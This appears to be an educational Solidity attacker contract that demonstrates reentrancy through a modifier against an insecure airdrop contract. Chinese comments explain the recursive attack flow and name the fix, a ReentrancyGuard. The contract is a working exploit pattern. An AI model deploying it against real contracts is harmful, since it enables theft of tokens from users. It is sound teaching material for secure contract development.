// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//--------------------------------------------------------------------------//
// Copyright 2022 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//--------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-03-reentrancy-via-modifier-fba6b1d8ff81
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-03-reentrancy-via-modifier/

pragma solidity ^0.8.13;

import "./IAirdropReceiver.sol";
import "hardhat/console.sol";


interface IAirdrop {
    function receiveAirdrop() external;
    function getUserBalance(address _user) external view returns (uint256);
}

// 网上介绍最多的是 单函数的重入攻击，参考：truffle-solidity/contracts/ReEntrancy/Vulnerability.sol
// 这里演示 因为 Modifier导致的重入攻击 Reentrancy_via_Modifier
// 攻击流程
// 1) attack 将 InsecureAirdrop的地址传入， InsecureAirdrop合约对应的方法用IAirdrop接口表示。
// 2) 调用Attack.attack()，设定总共要递归几次xTimes。
// 3) 调用到目标合约的receiveAirdrop() 函数，neverReceiveAirdrop 检查发现是false，未收取过。
// 4) canReceiveAirdrop() 方法 会判断是否是合约地址，是合约地址的话，要调用合约上的canReceiveAirdrop，又回到 Attack合约。
// 5) Attack的canReceiveAirdrop内判断总递归次数不到xTimes的次数，则继续调用InsecureAirdrop的receiveAirdrop。
// 6) 重复 3) ~ 5) ,直到 递归次数满足>=xTimes的次数. 然后返回 true。
// 7) InsecureAirdrop 设置 userBalances 余额 和 receivedAirdrops 标志位。第一次 将 余额++
// 8) 返回上层递归，在Attack.canReceiveAirdrop() 的receiveAirdrop() 返回， 又执行到后面的true。 注意这里 最后是在 if外 函数最后处返回 true。
// 9) InsecureAirdrop的 设置 userBalances 余额 和 receivedAirdrops 标志位。第二次 将 余额++
// 10) 堆栈不断退出。余额不断累加。
// 11) 检查 getBalance() 获取到 余额 增多
// 修正：
// 使用一个额外的 ReentrancyGuard，并放在modifier最前面。

contract AttackViaModifier is IAirdropReceiver {
    IAirdrop public immutable airdrop;

    uint256 public xTimes;
    uint256 public xCount;

    constructor(address _airdrop) {
        airdrop = IAirdrop(_airdrop);
    }

    function canReceiveAirdrop() external override returns (bool) {
        console.log("current xCount:%d, xTimes:%d", xCount,xTimes);
        if (xCount < xTimes) {
            xCount++;
            airdrop.receiveAirdrop();
        }
        return true;  // 这里 直接返回 true 和 将 这个 true放到 if对应的 else 分支里，效果也是不一样的。可以试试
    }

    function attack(uint256 _xTimes) external {
        xTimes = _xTimes;
        xCount = 1;

        airdrop.receiveAirdrop();
    }

    function getBalance() external view returns (uint256) {
        return airdrop.getUserBalance(address(this));
    }
}
